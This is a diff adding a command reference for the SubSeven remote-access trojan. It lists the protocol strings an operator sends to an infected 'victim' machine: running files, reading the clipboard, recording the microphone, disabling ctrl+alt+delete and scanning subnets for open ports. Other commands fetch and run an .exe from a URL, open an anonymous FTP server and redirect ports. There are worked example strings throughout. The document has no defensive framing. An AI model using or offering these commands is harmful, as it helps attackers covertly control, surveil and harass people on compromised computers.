@@ -1,0 +1,71 @@
+---------------------- Sub 7 commands ----------------------
+---------------------- Drafted by DoNkEy_BoNg ----------------------
+-----------------
+NPD<password> - changes the password of the server
+*NOTE* to remove the password, use NPD_PZD
+PWD<password> - sends password(only used on startup)
+CPT<port> - changes server port
+HGU - disconnects the victim(only with modem)
+CLS - close the server
+FMX<path/file> - runs a file
+COM<path/file> - shell executes a file
+SAY<text> - says text on victims speakers(Needs Truevoice)
+RCT - gets clipboard contents
+FLP<#> - Flips screen(10 = vertical, 1 = horizontal,11 = both)
+PRN<bold><italics><underline><strikethrough><fontsize><text> - Prints text, 0 or 1 for the formatting...ex PRN001014Hi! would print an underlined Hi!
+URL<site> - Opens victims browser to <site>
+CRS - Gets available screen resolutions
+CRT<#> - Changes Resolution to #, which are displayed in CRS
+CWCcl<color1>;cl<color2>;cl<color3> - changes colors: color1 = menus, color2 = 3d face, color3 = window color
+RWC - Changes colors back to default
+SNS<underline><strikeout><italic><centered/random><bold><scrollspeed><fontsize><textcolor><bgcolor><font-number><font-name><text> - Changes screen saver settings, 0/1 for text styles, 0/1 for centered/random, scrollspeed is a 3-digit integer from 000-600, fontsize is a 2-digit integer from 01-99,text and bgcolor are 11-digit color codes,font numbers are 05 for arial, 15 for Times new roman, 12 for courrier new, font-name is the name with the font #, and text is the screen saver text. Ex: SNS0110060077255000000255255255015Times New Romanbuhahahahaha
+RSS - Turns on screen saver
+RMB - Reverse mouse buttons
+BMB - Restore mouse buttons
+SMC<on/off> - Show/hide mouse cursor
+MM<Start/Stop> - Start/Stop controlling the mouse
+SMT<#/off> - Sets mouse trails(# must be 1-10), off disables them
+RSF<#> - Records # of seconds through the victims microphone
+SVT - Gets victims volume settings, server returns VRead<octet1><octet2><octet3>, 1 is wave, 2 is synth, 3 is CD
+RTD - Gets current time/date. Server returns RTD0<year><month><date>0<military time>
+<H/S>DI - Hides/Shows desktop icons
+TM<N/F> - Turns monitor oN/oFF
+STA<#> - Hides/Shows victims start menu(1 to hide, 2 to show)
+CA<E/D> - Enable/Disable ctrl+alt+delete and alt+tab
+<H/S>TB - Hide/Show the taskbar
+<O/C>CD - Open/Close the CD-ROM drive
+SP<#> - Continously Beep the speaker, 1 to beep, 2 to turn it off
+SCL<ON/OFF> - Turn scroll lock ON/OFF
+CSL<ON/OFF> - Same thing, but with caps lock instead
+NML<ON/OFF> - Same thing yet again, with num lock
+RIS - Remote IP scanner, this one takes some explaining to do:
+------------
+The remote scanner will scan any given subnet for a specific port.
+Ok, the remote IP scanner code is sent in one packet, with the parameters seperated by linefeeds(\n in C)
+The first 3 parameters are the 1st set of octets of the starting IP range: RIS24<linefeed>0<linefeed>0<linefeed>
+As you might have guessed, parameters 4-6 are the 2nd set of octets, sent the same way
+Parameter 7 is the port to scan, and parameter 8 is the delay
+So to instruct the server to scan 24.0.0.1 through 24.255.255.255 for port 420 with a 1ms delay, use this string in C: "RIS24\n0\n0\n24\n255\n255\n420\n1"
+Or, if your one of those mIRC kiddies that knows nothing about C, you can use RIS24 $+ $cr $+ $cr $+ 0 $+ $cr $+ 0 $+ $cr $+ 24 $+ $cr $+ 255 $+ $cr $+ 255 $+ $cr $+ 420 $+ $cr $+ 1
+At the beginning of the scan, the server will say "ATSMscanning started...ETSM", then "scanning started.ATSMscanning X.X.X.*ETSM"
+Then, while scanning, it'll say "ATSMfound: X.X.X.<#>ETSM" if the port is open on that IP address.
+Once the scan is done, it will say "ATSMscanning finished.ETSM"
+------------
+SIS - Stop remote IP scanner
+GMI - get computer info
+GHI - get home info(this most likley will not get any info, just a shitload of not found's)
+UFU<Url> - Update server file from URL(must be an .exe)
+RMS - Remove server completley
+RSP - Restart server
+MW:<buttons><msgicon><title>ZJXX<text> - Sends a msgbox to victim, buttons: 0 OK, 1 Abort/Retry/Ignore,2 OK/Cancel,3 Retry/Cancel,4 Yes/No,5 Yes/No/Cancel.msgicons: 0 no icon,1 warning,2 info,3 error,4 question.
+FTPenable!<password>@@@<port>:::<max-clients>$$$<root-folder> - Enable FTP server, leave password blank for anonymous access
+FTPdisable - Disable FTP server
+FFN<F/T>05<wildcardmask><root-folder> - Find files, T to search sub-folders, F to search only 1 folder, wildcardmask is the file type Ex. *.exe
+APR<inputport>$$$<host/ip>???><outputport> - Enable port redirection with specified parameters
+SPR<inputport> - Remove port redirection for specified port
+GPR - Get redirected ports, server returns 4 packets:
+	1st packet is GPR<#>
+	2nd packet is the input port
+	3rd packet is the hostname
+	4th packet is the output port
+DOS<pathname&file> - Application redirect, server returns output
